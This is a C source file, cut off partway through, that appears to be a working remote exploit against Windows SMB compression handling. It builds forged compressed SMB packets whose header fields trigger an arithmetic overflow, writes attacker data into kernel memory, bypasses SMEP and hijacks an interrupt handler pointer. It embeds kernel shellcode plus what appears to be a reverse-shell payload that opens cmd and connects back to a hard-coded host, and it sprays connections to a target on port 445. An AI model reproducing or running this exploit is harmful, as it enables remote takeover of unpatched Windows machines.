#include <stdio.h>
#include <stdint.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <TlHelp32.h>
#include "ntos.h"

#pragma comment(lib, "ws2_32.lib")


CHAR rin0_ShellCode[] = "\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x51\x52\x53\x56\x57\x48\xB8\xF0\x04\x00\x00\x80\xF7\xFF\xFF\x48\x8B\x00\x48\x85\xC0\x48\x81\xEC\x00\x06\x00\x00\x49\xBE\x50\x05\x00\x00\x80\xF7\xFF\xFF\x49\x8B\x06\x49\x8B\x5E\x08\x48\x89\x18\x41\xBC\x20\x00\x00\x00\xFB\x48\x31\xC9\x45\x0F\x20\xC2\x44\x0F\x22\xC1\xB9\x82\x00\x00\xC0\x0F\x32\x25\x00\xF0\xFF\xFF\x48\xC1\xE2\x20\x48\x01\xD0\x48\x2D\x00\x10\x00\x00\x66\x81\x38\x4D\x5A\x75\xF3\x49\x89\xC7\x48\x89\xC5\x4D\x89\x7E\x10\x48\x31\xC0\x48\x31\xC9\x48\x31\xD2\x48\x31\xFF\x48\x31\xDB\x8B\x45\x3C\x8B\x8C\x05\x88\x00\x00\x00\x48\x01\xE9\x8B\x59\x20\x48\x01\xEB\x48\x31\xC0\x48\x31\xD2\x48\x31\xF6\x48\xFF\xC7\x8B\x34\xBB\x48\x01\xEE\x99\x8A\x06\x38\xE0\x74\x0A\xC1\xCA\x07\x01\xC2\x48\xFF\xC6\xEB\xF0\x81\xFA\xCD\x19\xFB\x2A\x74\x3A\x81\xFA\x8D\xC7\x94\x5B\x74\x32\x81\xFA\xAE\xA7\x40\x01\x74\x2A\x81\xFA\x45\x48\x64\x58\x74\x22\x81\xFA\x9F\x90\xDD\x99\x74\x1A\x81\xFA\x69\x18\x46\xAE\x74\x12\x81\xFA\x45\xFF\x3F\x2A\x74\x0A\x81\xFA\x8A\x5C\x24\x12\x74\x02\xEB\x9E\x53\x48\x31\xDB\x8B\x59\x24\x48\x01\xEB\x66\x8B\x3C\x7B\x8B\x59\x1C\x48\x01\xEB\x44\x8B\x04\xBB\x49\x01\xE8\x4F\x89\x04\x26\x49\x83\xC4\x08\x5B\x49\x83\xFC\x60\x0F\x85\x70\xFF\xFF\xFF\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x48\xBA\x65\x78\x70\x6C\x6F\x72\x65\x72\x48\x8B\x98\xE8\x02\x00\x00\x48\x83\xFB\x04\x74\x1B\x48\x8B\x88\x50\x04\x00\x00\x48\x39\xD1\x74\x18\x48\x8B\x80\xF0\x02\x00\x00\x48\x2D\xF0\x02\x00\x00\xEB\xD8\x4C\x8B\x90\x60\x03\x00\x00\xEB\xE8\x48\xBB\x68\x05\x00\x00\x80\xF7\xFF\xFF\x48\x89\x03\x4C\x89\x90\x60\x03\x00\x00\x49\x89\xC5\xEB\x22\x0D\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x50\x73\x50\x72\x6F\x63\x65\x73\x73\x54\x79\x70\x65\x00\x48\x31\xC9\xBA\x00\x01\x00\x00\x48\xBF\x70\x05\x00\x00\x80\xF7\xFF\xFF\xFF\x17\x48\x8D\x1D\xCB\xFF\xFF\xFF\x48\x8D\x35\xD0\xFF\xFF\xFF\x48\x89\xC7\xB9\x0D\x00\x00\x00\xF3\xA4\x48\x89\x03\x4C\x89\xF9\x48\x89\xC2\x48\xBF\xA0\x05\x00\x00\x80\xF7\xFF\xFF\xFF\x17\x48\x83\xF8\x00\x0F\x84\x38\x01\x00\x00\x48\x8B\x00\x48\x89\x44\x24\x20\x48\xC7\x44\x24\x28\x00\x00\x00\x00\x48\xBE\x80\x04\x00\x00\x80\xF7\xFF\xFF\x48\x89\x74\x24\x30\x4C\x89\xE9\xBA\x40\x02\x00\x00\x4D\x31\xC0\x41\xB9\x00\x00\x00\x10\x48\xB8\x90\x05\x00\x00\x80\xF7\xFF\xFF\xFF\x10\x48\xB9\x80\x04\x00\x00\x80\xF7\xFF\xFF\x48\x8B\x09\x48\xC7\x44\x24\x20\x00\x10\x00\x00\x48\xC7\x44\x24\x28\x40\x00\x00\x00\x48\xBA\x88\x04\x00\x00\x80\xF7\xFF\xFF\x4D\x31\xC0\x49\xB9\x90\x04\x00\x00\x80\xF7\xFF\xFF\x49\xC7\x01\x00\x20\x00\x00\x48\xB8\xA8\x05\x00\x00\x80\xF7\xFF\xFF\xFF\x10\x48\xBA\xA0\x04\x00\x00\x80\xF7\xFF\xFF\x4C\x89\xE9\x48\xB8\x78\x05\x00\x00\x80\xF7\xFF\xFF\xFF\x10\xEB\x00\x48\x8D\x35\xD6\x00\x00\x00\x48\xB8\x88\x04\x00\x00\x80\xF7\xFF\xFF\x48\x8B\x00\x48\x89\xC7\xB9\x00\x04\x00\x00\xF3\xA4\x48\xB9\x80\x04\x00\x00\x80\xF7\xFF\xFF\x48\x8B\x09\x48\x31\xD2\x4D\x31\xC0\x4D\x31\xC9\x48\xC7\x44\x24\x20\x00\x00\x00\x00\x48\xC7\x44\x24\x28\x00\x00\x00\x00\x48\xB8\x88\x04\x00\x00\x80\xF7\xFF\xFF\x48\x8B\x00\x48\x89\x44\x24\x30\x48\x89\x44\x24\x38\x48\xB8\x50\x06\x00\x00\x80\xF7\xFF\xFF\x48\x89\x44\x24\x40\x48\xC7\x44\x24\x48\x00\x00\x00\x00\x48\xB8\x98\x05\x00\x00\x80\xF7\xFF\xFF\xFF\x10\x48\xB9\xA0\x04\x00\x00\x80\xF7\xFF\xFF\x48\xB8\x80\x05\x00\x00\x80\xF7\xFF\xFF\xFF\x10\x41\xBA\x02\x00\x00\x00\x45\x0F\x22\xC2\x48\xB8\xF0\x04\x00\x00\x80\xF7\xFF\xFF\x48\x89\xC3\x48\x8B\x00\x48\xFF\xC0\x48\x89\x03\xFA\x48\x81\xC4\x00\x06\x00\x00\x4C\x89\xF0\x48\x83\xC0\x08\x5F\x5E\x5B\x5A\x59\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59\x41\x58\xFF\x20\x90"\
// Ring3 ShellCode
	"\x90\x90\x90\x90\x90\x90"\
	"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x06\x60\xc0\xa8\x43\x01\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
	"\x90";



#define KUSER_SHARED_DATA 0xFFFFF78000000000

#define Write_Default_Offset 0x1108

WORD OF = 0, PagedRead_Of = 0x200;

ULONG64 FK_HalpApicRequestInterrupt = NULL, FK_HalpApicStartProcessor = NULL,HalpApicStartProcessor = NULL, PTE_Base = NULL,HalHeapBase = NULL, KUSER_SHARED_DATA_PTE_Address = NULL,P_HalpApicRequestInterrupt_OffSet = NULL, HalpApicRequestInterrupt = NULL, Paged_Flags = NULL, Paged_Offset = NULL, Find_Case = NULL;


SOCKET Sock_List[0x500],Sock_List2[0x500], Sock_List3[0x500];


UINT send_compressed_Set_MDL(SOCKET sock,WORD,ULONG64);
UINT send_compressed_FUCK_MDL(SOCKET sock);


BOOL SendAll(SOCKET& sock, CHAR* buffer, UINT size) {

	//__debugbreak();
	INT SendSize = 0;

	while (size > 0) {
		SendSize = send(sock, buffer, size, 0);
		if (SOCKET_ERROR == SendSize) {
			//printf("Send Error!\n");
			return FALSE;
		}
		size = size - SendSize;
		buffer += SendSize;
	}
	return TRUE;
}




int error_exit(SOCKET sock, const char* msg) {
	int err;
	if (msg != NULL) {
		printf("%s failed with error: %d\n", msg, WSAGetLastError());
	}
	if ((err = closesocket(sock)) == SOCKET_ERROR) {
		printf("closesocket() failed with error: %d\n", WSAGetLastError());
	}
	WSACleanup();
	return EXIT_FAILURE;
}




UINT send_compressed_FUCK_MDL(SOCKET sock) {
	int err = 0;
	char response[8] = { 0 };

	UINT Sizes = 0x1138;

	ULONG len = 0;



	const uint8_t buf[] = {
		/* NetBIOS Wrapper */
		0x00,
		0x00, 0x11, 0x55,   //

		/* SMB Header */
		0xFC, 0x53, 0x4D, 0x42, /* protocol id */
		0xb6, 0xF0, 0xFF, 0xFF, /* original decompressed size, trigger arithmetic overflow */
		0x02, 0x00,             /* compression algorithm, LZ77 */
		0x00, 0x00,             /* flags */
		0x38, 0x11, 0x00, 0x00, /* offset*/
	};

	ULONG buffer_size = 0x8;
	UCHAR* buffer = (UCHAR*)malloc(buffer_size);
	if (buffer == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}


	//0x1108
	memset(buffer, 'R', 0x8);


	* (uint64_t*)(buffer) = KUSER_SHARED_DATA + 0x800; /* where we want to write */ 

	ULONG CompressBufferWorkSpaceSize = 0;
	ULONG CompressFragmentWorkSpaceSize = 0;
	err = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS,
		&CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize);

	if (err != STATUS_SUCCESS) {
		printf("RtlGetCompressionWorkSpaceSize() failed with error: %d\n", err);
		return error_exit(sock, NULL);
	}

	ULONG FinalCompressedSize = 0;
	UCHAR compressed_buffer[64];
	LPVOID lpWorkSpace = malloc(CompressBufferWorkSpaceSize);
	if (lpWorkSpace == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	err = RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, buffer, buffer_size,
		compressed_buffer, sizeof(compressed_buffer), 4096, &FinalCompressedSize, lpWorkSpace);

	if (err != STATUS_SUCCESS) {
		printf("RtlCompressBuffer() failed with error: %#x\n", err);
		free(lpWorkSpace);
		return error_exit(sock, NULL);
	}

	len = FinalCompressedSize;


	uint8_t* packet = (uint8_t*)malloc(sizeof(buf) + Sizes + len);

	memset(packet, 0x00, sizeof(buf) + Sizes + len);

	if (packet == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	memcpy(packet, buf, sizeof(buf));


	memcpy(packet + 0x114C, compressed_buffer, len); /* where we want to write */ 


	SendAll(sock, (char*)packet, 0x20 + Sizes + len);


	recv(sock, response, sizeof(response), 0);


	free(packet);

	return err;
}



UINT send_compressed_Set_MDL(SOCKET sock,WORD Read_Offset,ULONG64 Read_Paged) {

	int err = 0;
	char* response = (char *)malloc(0x1000);

	memset(response,0x00,0x1000);

	const uint8_t buf[] = {
		/* NetBIOS Wrapper */
		0x00,
		0x00, 0x00, 0x73,

		/* SMB Header */
		0xFC, 0x53, 0x4D, 0x42, /* protocol id */
		0xBF, 0xFF, 0xFF, 0xFF, /* original decompressed size, trigger arithmetic overflow 0xff - 0x50 */ 
		0x02, 0x00,             /* compression algorithm, LZ77 */
		0x00, 0x00,             /* flags */
		0x50, 0x00, 0x00, 0x00, /* offset */
	};

	ULONG buffer_size = 0x1110-58-6;
	CHAR* buf1 = (CHAR*)malloc(buffer_size);

	memset((VOID*)buf1, 'A', 0x1108-58-6);


	*(uint64_t*)(buf1 + 0x1108-58-6) = KUSER_SHARED_DATA + 0x800; /* where we want to write */





	ULONG CompressBufferWorkSpaceSize = 0;
	ULONG CompressFragmentWorkSpaceSize = 0;
	err = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS,
		&CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize);

	if (err != STATUS_SUCCESS) {
		printf("RtlGetCompressionWorkSpaceSize() failed with error: %d\n", err);
		return error_exit(sock, NULL);
	}

	ULONG FinalCompressedSize;
	UCHAR compressed_buffer[0x200];
	memset(compressed_buffer,0x00,0x200);
	LPVOID lpWorkSpace = malloc(CompressBufferWorkSpaceSize);
	if (lpWorkSpace == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	err = RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, (PUCHAR)buf1, buffer_size,
		compressed_buffer, sizeof(compressed_buffer), 4096, &FinalCompressedSize, lpWorkSpace);

	if (err != STATUS_SUCCESS) {
		printf("RtlCompressBuffer() failed with error: %#x\n", err);
		free(lpWorkSpace);
		return error_exit(sock, NULL);
	}


	uint8_t* packet = (uint8_t*)malloc(sizeof(buf) + 0x50 + FinalCompressedSize);
	if (packet == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	memcpy(packet, buf, sizeof(buf));


	// Set MDL For Information disclosure
	*(uint64_t*)(packet + sizeof(buf) + 0x00) = 0x0000000000000000;
	*(uint64_t*)(packet + sizeof(buf) + 0x08) = 0x0b47028050040040;
	*(uint64_t*)(packet + sizeof(buf) + 0x10) = 0x0000000000000000;
	*(uint64_t*)(packet + sizeof(buf) + 0x18) = KUSER_SHARED_DATA+0x50;
	*(uint64_t*)(packet + sizeof(buf) + 0x20) = KUSER_SHARED_DATA;
	*(uint64_t*)(packet + sizeof(buf) + 0x28) = 0x0000000000001000;


	*(uint64_t*)(packet + sizeof(buf) + 0x30) = Read_Paged;
	*(uint64_t*)(packet + sizeof(buf) + 0x38) = Read_Paged;
	*(uint64_t*)(packet + sizeof(buf) + 0x40) = Read_Paged;
	*(uint64_t*)(packet + sizeof(buf) + 0x48) = Read_Paged;


	*(WORD*)(packet + sizeof(buf) + 0x2C) = Read_Offset;




	memcpy(packet + sizeof(buf) + 0x50, compressed_buffer, FinalCompressedSize);

	if ((err = send(sock, (const char*)packet, sizeof(buf) + 0x50 + FinalCompressedSize, 0)) != SOCKET_ERROR) {
		recv(sock, response, sizeof(response), 0);
	}

	free(packet);
	return err;
}





UINT send_compressed_ByPass_SMEP(SOCKET sock) {

	int err = 0;
	char* response = (char*)malloc(0x1000);

	memset(response, 0x00, 0x1000);

	const uint8_t buf[] = {
		/* NetBIOS Wrapper */
		0x00,
		0x00, 0x00, 0x73,

		/* SMB Header */
		0xFC, 0x53, 0x4D, 0x42, /* protocol id */
		0xBF, 0xFF, 0xFF, 0xFF, /* original decompressed size, trigger arithmetic overflow 0xff - 0x50 */
		0x02, 0x00,             /* compression algorithm, LZ77 */
		0x00, 0x00,             /* flags */
		0x50, 0x00, 0x00, 0x00, /* offset */
	};

	ULONG buffer_size = 0x1110 - 58 - 6;
	CHAR* buf1 = (CHAR*)malloc(buffer_size);

	memset((VOID*)buf1, 'A', 0x1108 - 58 - 6);


	*(uint64_t*)(buf1 + 0x1108 - 58 - 6) = KUSER_SHARED_DATA_PTE_Address+0x06; /* where we want to write */





	ULONG CompressBufferWorkSpaceSize = 0;
	ULONG CompressFragmentWorkSpaceSize = 0;
	err = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS,
		&CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize);

	if (err != STATUS_SUCCESS) {
		printf("RtlGetCompressionWorkSpaceSize() failed with error: %d\n", err);
		return error_exit(sock, NULL);
	}

	ULONG FinalCompressedSize;
	UCHAR compressed_buffer[0x200];
	memset(compressed_buffer, 0x00, 0x200);
	LPVOID lpWorkSpace = malloc(CompressBufferWorkSpaceSize);
	if (lpWorkSpace == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	err = RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, (PUCHAR)buf1, buffer_size,
		compressed_buffer, sizeof(compressed_buffer), 4096, &FinalCompressedSize, lpWorkSpace);

	if (err != STATUS_SUCCESS) {
		printf("RtlCompressBuffer() failed with error: %#x\n", err);
		free(lpWorkSpace);
		return error_exit(sock, NULL);
	}


	uint8_t* packet = (uint8_t*)malloc(sizeof(buf) + 0x50 + FinalCompressedSize);
	if (packet == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	memcpy(packet, buf, sizeof(buf));


	// Set MDL For Information disclosure
	*(uint64_t*)(packet + sizeof(buf) + 0x00) = 0x0000000000000000;
	*(uint64_t*)(packet + sizeof(buf) + 0x08) = 0x0000000000000000;
	*(uint64_t*)(packet + sizeof(buf) + 0x10) = 0x0000000000000000;
	*(uint64_t*)(packet + sizeof(buf) + 0x18) = 0x0000000000000000;
	*(uint64_t*)(packet + sizeof(buf) + 0x20) = 0x0000000000000000;
	*(uint64_t*)(packet + sizeof(buf) + 0x28) = 0x0000000000000000;


	*(uint64_t*)(packet + sizeof(buf) + 0x30) = 0x0000000000000000;
	*(uint64_t*)(packet + sizeof(buf) + 0x38) = 0x0000000000000000;
	*(uint64_t*)(packet + sizeof(buf) + 0x40) = 0x0000000000000000;
	*(uint64_t*)(packet + sizeof(buf) + 0x48) = 0x0000000000000000;


	*(WORD*)(packet + sizeof(buf) + 0x2C) = 0x0000000000000000;




	memcpy(packet + sizeof(buf) + 0x50, compressed_buffer, FinalCompressedSize);

	if ((err = send(sock, (const char*)packet, sizeof(buf) + 0x50 + FinalCompressedSize, 0)) != SOCKET_ERROR) {
		recv(sock, response, sizeof(response), 0);
	}

	free(packet);
	return err;
}




UINT send_compressed_SetHalpApicRequestInterrupt(SOCKET sock) {

	int err = 0;
	char* response = (char*)malloc(0x1000);

	memset(response, 0x00, 0x1000);

	const uint8_t buf[] = {
		/* NetBIOS Wrapper */
		0x00,
		0x00, 0x00, 0x33,

		/* SMB Header */
		0xFC, 0x53, 0x4D, 0x42, /* protocol id */
		0xFF, 0xFF, 0xFF, 0xFF, /* original decompressed size, trigger arithmetic overflow 0xff - 0x50 */
		0x02, 0x00,             /* compression algorithm, LZ77 */
		0x00, 0x00,             /* flags */
		0x10, 0x00, 0x00, 0x00, /* offset */
	};

	ULONG buffer_size = 0x1110;
	CHAR* buf1 = (CHAR*)malloc(buffer_size);

	memset((VOID*)buf1, 'A', 0x1108);


	// 0xFFFFF78000000000

	*(uint64_t*)(buf1 + 0x1108) = P_HalpApicRequestInterrupt_OffSet; /* where we want to write */

	ULONG CompressBufferWorkSpaceSize = 0;
	ULONG CompressFragmentWorkSpaceSize = 0;
	err = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS,
		&CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize);

	if (err != STATUS_SUCCESS) {
		printf("RtlGetCompressionWorkSpaceSize() failed with error: %d\n", err);
		return error_exit(sock, NULL);
	}

	ULONG FinalCompressedSize;
	UCHAR compressed_buffer[64];
	LPVOID lpWorkSpace = malloc(CompressBufferWorkSpaceSize);
	if (lpWorkSpace == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	err = RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, (PUCHAR)buf1, buffer_size,
		compressed_buffer, sizeof(compressed_buffer), 4096, &FinalCompressedSize, lpWorkSpace);

	if (err != STATUS_SUCCESS) {
		printf("RtlCompressBuffer() failed with error: %#x\n", err);
		free(lpWorkSpace);
		return error_exit(sock, NULL);
	}


	uint8_t* packet = (uint8_t*)malloc(sizeof(buf) + 0x10 + FinalCompressedSize);
	if (packet == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	memcpy(packet, buf, sizeof(buf));

	//*(uint64_t*)(packet + sizeof(buf) + 0x00) = HalpApicRequestInterrupt;
	*(uint64_t*)(packet + sizeof(buf) + 0x00) = 0xFFFFF78000000850;
	*(uint64_t*)(packet + sizeof(buf) + 0x08) = HalpApicStartProcessor;

	memcpy(packet + sizeof(buf) + 0x10, compressed_buffer, FinalCompressedSize);
	if ((err = send(sock, (const char*)packet, sizeof(buf) + 0x10 + FinalCompressedSize, 0)) != SOCKET_ERROR) {
		recv(sock, response, sizeof(response), 0);
	}

	free(packet);
	return err;
}



UINT send_compressed_SetG(SOCKET sock) {

	int err = 0;
	char* response = (char*)malloc(0x1000);

	memset(response, 0x00, 0x1000);

	const uint8_t buf[] = {
		/* NetBIOS Wrapper */
		0x00,
		0x00, 0x00, 0x33,

		/* SMB Header */
		0xFC, 0x53, 0x4D, 0x42, /* protocol id */
		0xFF, 0xFF, 0xFF, 0xFF, /* original decompressed size, trigger arithmetic overflow 0xff - 0x50 */
		0x02, 0x00,             /* compression algorithm, LZ77 */
		0x00, 0x00,             /* flags */
		0x10, 0x00, 0x00, 0x00, /* offset */
	};

	ULONG buffer_size = 0x1110;
	CHAR* buf1 = (CHAR*)malloc(buffer_size);

	memset((VOID*)buf1, 'A', 0x1108);


	// 0xFFFFF78000000000

	*(uint64_t*)(buf1 + 0x1108) = 0xFFFFF78000000550; /* where we want to write */

	ULONG CompressBufferWorkSpaceSize = 0;
	ULONG CompressFragmentWorkSpaceSize = 0;
	err = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS,
		&CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize);

	if (err != STATUS_SUCCESS) {
		printf("RtlGetCompressionWorkSpaceSize() failed with error: %d\n", err);
		return error_exit(sock, NULL);
	}

	ULONG FinalCompressedSize;
	UCHAR compressed_buffer[64];
	LPVOID lpWorkSpace = malloc(CompressBufferWorkSpaceSize);
	if (lpWorkSpace == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	err = RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, (PUCHAR)buf1, buffer_size,
		compressed_buffer, sizeof(compressed_buffer), 4096, &FinalCompressedSize, lpWorkSpace);

	if (err != STATUS_SUCCESS) {
		printf("RtlCompressBuffer() failed with error: %#x\n", err);
		free(lpWorkSpace);
		return error_exit(sock, NULL);
	}


	uint8_t* packet = (uint8_t*)malloc(sizeof(buf) + 0x10 + FinalCompressedSize);
	if (packet == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	memcpy(packet, buf, sizeof(buf));

	//*(uint64_t*)(packet + sizeof(buf) + 0x00) = HalpApicRequestInterrupt;
	*(uint64_t*)(packet + sizeof(buf) + 0x00) = P_HalpApicRequestInterrupt_OffSet;
	*(uint64_t*)(packet + sizeof(buf) + 0x08) = HalpApicRequestInterrupt;

	memcpy(packet + sizeof(buf) + 0x10, compressed_buffer, FinalCompressedSize);
	if ((err = send(sock, (const char*)packet, sizeof(buf) + 0x10 + FinalCompressedSize, 0)) != SOCKET_ERROR) {
		recv(sock, response, sizeof(response), 0);
	}

	free(packet);
	return err;
}





UINT send_compressed_SetShellCode(SOCKET sock) {

	int err = 0;
	char* response = (char*)malloc(0x1000);

	char* SaveShellCode = (char*)malloc(0x700);

	memset(response, 0x00, 0x1000);
	memset(SaveShellCode, 0x00, 0x700);

	//__debugbreak();

	memcpy(SaveShellCode, rin0_ShellCode,0x700);

	const uint8_t buf[] = {
		/* NetBIOS Wrapper */
		0x00,
		0x00, 0x7, 0x23,

		/* SMB Header */
		0xFC, 0x53, 0x4D, 0x42, /* protocol id */
		0x0F, 0xF9, 0xFF, 0xFF, /* original decompressed size, trigger arithmetic overflow 0xff - 0x50 */
		0x02, 0x00,             /* compression algorithm, LZ77 */
		0x00, 0x00,             /* flags */
		0x00, 0x07, 0x00, 0x00, /* offset */
	};

	ULONG buffer_size = 0x1110-0x700+0x10;
	CHAR* buf1 = (CHAR*)malloc(buffer_size);

	memset((VOID*)buf1, 'A', 0x1108-0x700+0x10);


	// 0xFFFFF78000000000

	*(uint64_t*)(buf1 + 0x1108-0x700+0x10) = 0xFFFFF78000000850; /* where we want to write */

	ULONG CompressBufferWorkSpaceSize = 0;
	ULONG CompressFragmentWorkSpaceSize = 0;
	err = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS,
		&CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize);

	if (err != STATUS_SUCCESS) {
		printf("RtlGetCompressionWorkSpaceSize() failed with error: %d\n", err);
		return error_exit(sock, NULL);
	}

	ULONG FinalCompressedSize;
	UCHAR compressed_buffer[64];
	LPVOID lpWorkSpace = malloc(CompressBufferWorkSpaceSize);
	if (lpWorkSpace == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	err = RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, (PUCHAR)buf1, buffer_size,
		compressed_buffer, sizeof(compressed_buffer), 4096, &FinalCompressedSize, lpWorkSpace);

	if (err != STATUS_SUCCESS) {
		printf("RtlCompressBuffer() failed with error: %#x\n", err);
		free(lpWorkSpace);
		return error_exit(sock, NULL);
	}


	uint8_t* packet = (uint8_t*)malloc(sizeof(buf) + 0x1700 + FinalCompressedSize);
	if (packet == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	memcpy(packet, buf, sizeof(buf));

	//__debugbreak();
	memcpy(packet + sizeof(buf), SaveShellCode, 0x700);

	memcpy(packet + sizeof(buf) + 0x700, compressed_buffer, FinalCompressedSize);
	if ((err = send(sock, (const char*)packet, sizeof(buf) + 0x800 + FinalCompressedSize, 0)) != SOCKET_ERROR) {
		recv(sock, response, sizeof(response), 0);
	}

	free(packet);
	return err;
}










UINT Init_SockList(VOID) {

	int iTimeOut = 300000;

	for (UINT IC = 0; IC < 0x200;IC++) {

		Sock_List[IC] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (Sock_List[IC] == INVALID_SOCKET) {
			printf("socket() failed with error: %d\n", WSAGetLastError());

			return EXIT_FAILURE;
		}

		sockaddr_in client;
		client.sin_family = AF_INET;
		client.sin_port = htons(445);
		InetPton(AF_INET, "192.168.67.3", &client.sin_addr);
		setsockopt(Sock_List[IC], SOL_SOCKET, SO_RCVTIMEO, (char*)&iTimeOut, sizeof(iTimeOut));
		setsockopt(Sock_List[IC], SOL_SOCKET, SO_SNDTIMEO, (char*)&iTimeOut, sizeof(iTimeOut));

		if (connect(Sock_List[IC], (sockaddr*)&client, sizeof(client)) == SOCKET_ERROR) {
			return error_exit(Sock_List[IC], "connect()");
		}

	}

	for (UINT IC = 0; IC < 0x200; IC++) {

		Sock_List2[IC] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (Sock_List2[IC] == INVALID_SOCKET) {
			printf("socket() failed with error: %d\n", WSAGetLastError());

			return EXIT_FAILURE;
		}

		sockaddr_in client;
		client.sin_family = AF_INET;
		client.sin_port = htons(445);
		InetPton(AF_INET, "192.168.67.3", &client.sin_addr);

		setsockopt(Sock_List2[IC], SOL_SOCKET, SO_RCVTIMEO, (char*)&iTimeOut, sizeof(iTimeOut));
		setsockopt(Sock_List2[IC], SOL_SOCKET, SO_SNDTIMEO, (char*)&iTimeOut, sizeof(iTimeOut));


		if (connect(Sock_List2[IC], (sockaddr*)&client, sizeof(client)) == SOCKET_ERROR) {
			return error_exit(Sock_List2[IC], "connect()");
		}

	}

	for (UINT IC = 0; IC < 0x200; IC++) {

		Sock_List3[IC] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (Sock_List3[IC] == INVALID_SOCKET) {
